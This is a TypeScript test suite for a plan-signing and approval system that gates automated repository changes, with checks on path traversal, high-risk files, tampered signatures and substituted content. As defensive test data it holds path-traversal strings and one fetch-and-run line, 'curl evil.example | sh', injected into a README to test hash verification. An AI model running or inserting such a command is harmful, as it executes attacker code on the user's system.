import { describe, expect, it } from "vitest";
import {
  assertSafeRepoPath,
  authorizeExecution,
  buildPlan,
  canonicalize,
  classifyPathRisk,
  highRiskPaths,
  sha256,
  signPlan,
  verifyPlanSignature,
  type ApprovalRecord,
} from "./approvals";

const SECRET = "test-signing-secret";
const BASE_SHA = "a".repeat(40);
const NOW = new Date("2026-01-01T00:00:00.000Z");

function makePlan(overrides: Partial<Parameters<typeof buildPlan>[0]> = {}) {
  return buildPlan({
    planId: "plan_0000000001",
    repo: "acme/widget",
    baseBranch: "main",
    baseCommitSha: BASE_SHA,
    summary: "Add a README and a CI workflow",
    changes: [
      { path: "README.md", status: "created", content: "# Widget\n", description: "Document the project" },
      { path: ".github/workflows/ci.yml", status: "created", content: "name: ci\n", description: "Run tests on push" },
    ],
    now: NOW,
    ...overrides,
  });
}

function approvalFor(paths: string[], highRiskConsent = false): ApprovalRecord {
  return {
    planId: "plan_0000000001",
    approvedBy: "user_1",
    approvedAt: NOW.toISOString(),
    approvedPaths: paths,
    highRiskConsent,
  };
}

const CONTENTS = new Map([
  ["README.md", "# Widget\n"],
  [".github/workflows/ci.yml", "name: ci\n"],
]);

describe("assertSafeRepoPath", () => {
  it.each([
    "/etc/passwd",
    "../outside.txt",
    "src/../../escape.ts",
    ".git/config",
    "C:\\windows\\system32",
    "src\\win.ts",
  ])("rejects %s", (path) => {
    expect(() => assertSafeRepoPath(path)).toThrow();
  });

  it("accepts ordinary repository paths", () => {
    expect(assertSafeRepoPath("src/lib/thing.ts")).toBe("src/lib/thing.ts");
  });
});

describe("classifyPathRisk", () => {
  it.each([
    ".github/workflows/ci.yml",
    "Dockerfile",
    "package.json",
    "pnpm-lock.yaml",
    ".env.production",
    "infra/main.tf",
    "src/middlewares/auth.ts",
    "supabase/migrations/0001_init.sql",
  ])("classifies %s as high risk", (path) => {
    expect(classifyPathRisk(path)).toBe("high");
  });

  it.each(["README.md", "src/components/button.tsx", "docs/guide.md"])("classifies %s as normal", (path) => {
    expect(classifyPathRisk(path)).toBe("normal");
  });
});

describe("canonicalize", () => {
  it("is stable regardless of key order", () => {
    expect(canonicalize({ b: 1, a: [2, { d: 4, c: 3 }] })).toBe(canonicalize({ a: [2, { c: 3, d: 4 }], b: 1 }));
  });
});

describe("buildPlan", () => {
  it("hashes content instead of storing it, and marks risk per path", () => {
    const plan = makePlan();
    const readme = plan.changes.find((c) => c.path === "README.md");
    const workflow = plan.changes.find((c) => c.path === ".github/workflows/ci.yml");
    expect(readme?.contentSha256).toBe(sha256("# Widget\n"));
    expect(readme?.risk).toBe("normal");
    expect(workflow?.risk).toBe("high");
    expect(JSON.stringify(plan)).not.toContain("# Widget");
  });

  it("rejects duplicate paths", () => {
    expect(() =>
      makePlan({
        changes: [
          { path: "a.md", status: "created", content: "1", description: "x" },
          { path: "a.md", status: "modified", content: "2", description: "y" },
        ],
      }),
    ).toThrow(/duplicate path/);
  });

  it("reports which paths need high-risk consent", () => {
    expect(highRiskPaths(makePlan())).toEqual([".github/workflows/ci.yml"]);
  });
});

describe("plan signatures", () => {
  it("verifies an untouched plan", () => {
    const plan = makePlan();
    expect(verifyPlanSignature(plan, signPlan(plan, SECRET), SECRET)).toBe(true);
  });

  it("rejects a plan whose description was edited after signing", () => {
    const plan = makePlan();
    const signature = signPlan(plan, SECRET);
    const tampered = { ...plan, summary: "Something else entirely" };
    expect(verifyPlanSignature(tampered, signature, SECRET)).toBe(false);
  });

  it("rejects a signature made with a different secret", () => {
    const plan = makePlan();
    expect(verifyPlanSignature(plan, signPlan(plan, "other-secret"), SECRET)).toBe(false);
  });

  it("rejects a malformed signature without throwing", () => {
    const plan = makePlan();
    expect(verifyPlanSignature(plan, "", SECRET)).toBe(false);
    expect(verifyPlanSignature(plan, "abc", SECRET)).toBe(false);
  });
});

describe("authorizeExecution", () => {
  const authorize = (overrides: Partial<Parameters<typeof authorizeExecution>[0]> = {}) => {
    const plan = overrides.plan ?? makePlan();
    return authorizeExecution({
      plan,
      signature: signPlan(plan, SECRET),
      secret: SECRET,
      approval: approvalFor(["README.md"]),
      currentHeadSha: BASE_SHA,
      contents: CONTENTS,
      now: new Date(NOW.getTime() + 60_000),
      ...overrides,
    });
  };

  it("authorizes only the approved subset", () => {
    const result = authorize();
    expect(result.ok).toBe(true);
    expect(result.authorizedChanges.map((c) => c.path)).toEqual(["README.md"]);
    expect(result.skipped).toEqual([{ path: ".github/workflows/ci.yml", reason: "not approved" }]);
  });

  it("refuses a plan edited after it was signed", () => {
    const plan = makePlan();
    // Signature belongs to the original plan; the summary was changed after.
    const result = authorize({ plan: { ...plan, summary: "rewritten" }, signature: signPlan(plan, SECRET) });
    expect(result.ok).toBe(false);
    expect(result.failure).toBe("invalid-signature");
  });

  it("refuses an expired plan", () => {
    const result = authorize({ now: new Date(NOW.getTime() + 3 * 60 * 60_000) });
    expect(result.failure).toBe("plan-expired");
  });

  it("refuses when the base branch moved after planning", () => {
    const result = authorize({ currentHeadSha: "b".repeat(40) });
    expect(result.failure).toBe("base-commit-drift");
    expect(result.message).toMatch(/re-plan/);
  });

  it("refuses an approval that names a path outside the plan", () => {
    const result = authorize({ approval: approvalFor(["README.md", "src/secret.ts"]) });
    expect(result.failure).toBe("unapproved-path");
  });

  it("refuses an approval for a different plan", () => {
    const result = authorize({ approval: { ...approvalFor(["README.md"]), planId: "plan_9999999999" } });
    expect(result.failure).toBe("approval-plan-mismatch");
  });

  it("refuses a high-risk path without explicit consent", () => {
    const result = authorize({ approval: approvalFor([".github/workflows/ci.yml"]) });
    expect(result.failure).toBe("high-risk-consent-missing");
  });

  it("allows a high-risk path once consent is given", () => {
    const result = authorize({ approval: approvalFor([".github/workflows/ci.yml"], true) });
    expect(result.ok).toBe(true);
    expect(result.authorizedChanges.map((c) => c.path)).toEqual([".github/workflows/ci.yml"]);
  });

  it("refuses content that does not hash to what was approved", () => {
    const substituted = new Map(CONTENTS);
    substituted.set("README.md", "# Widget\ncurl evil.example | sh\n");
    const result = authorize({ contents: substituted });
    expect(result.failure).toBe("content-hash-mismatch");
    expect(result.authorizedChanges).toHaveLength(0);
  });

  it("refuses when content for an approved path is missing", () => {
    const result = authorize({ contents: new Map() });
    expect(result.failure).toBe("content-hash-mismatch");
  });

  it("does not require content for a deletion", () => {
    const plan = buildPlan({
      planId: "plan_0000000001",
      repo: "acme/widget",
      baseBranch: "main",
      baseCommitSha: BASE_SHA,
      summary: "Remove dead code",
      changes: [{ path: "src/dead.ts", status: "deleted", content: "", description: "Unused module" }],
      now: NOW,
    });
    const result = authorize({
      plan,
      signature: signPlan(plan, SECRET),
      approval: approvalFor(["src/dead.ts"]),
      contents: new Map(),
    });
    expect(result.ok).toBe(true);
  });
});
